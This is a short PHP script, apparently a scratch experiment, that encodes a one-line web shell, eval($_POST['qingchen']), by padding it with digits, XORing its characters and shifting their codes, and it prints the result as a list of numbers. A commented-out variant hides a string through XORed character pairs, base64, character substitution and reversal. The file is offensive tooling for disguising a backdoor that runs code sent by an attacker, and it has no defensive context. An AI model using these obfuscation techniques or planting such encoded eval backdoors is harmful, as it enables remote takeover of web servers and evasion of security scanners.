<?php

//function testaa(){
//    $str =  base64_encode(('Z'^'?').('X'^'.').('['^':').('X'^'4').('z'^'R') . ('M'^'i') . ('u'^'*') . ('!'^'q') . ('y'^'6').('|'^'/').('z'^'.').('}'^'&').('~'^'Y').('['^'*').('['^'8').('~'^'Y').('x'^'%').('P'^'y').('{'^'@'));
//    $str = str_replace('=','*',$str);
//    $str = strrev($str);
//    echo $str;
//}
function testaa(){
    $arr = [];
//    $str2 = "";
    $str = 'e0v0a0l($_PO1ST'."['q2ing3chen']);";
//    for($i=0;$i<strlen($str);$i++){
//        if(!((ord($str[$i])>=48) and (ord($str[$i])<=57))){
//            $str2 .= $str[$i];
//        }
//    }
//    echo $str2,"<br />";
    for($i=0;$i<strlen($str);$i++){
        $arr[$i] = $str[$i]^"*";
    }
//    var_dump($arr);
    for($i=0;$i<strlen($str);$i++){
//        echo ord($str[$i]) << 8,"<br />";
        $arr[$i] = ord($str[$i]) << 8;
    }
    return $arr;
//    echo $str;
}
$arr = testaa();
foreach ($arr as $k => $v){
    echo $v,",";
}

?>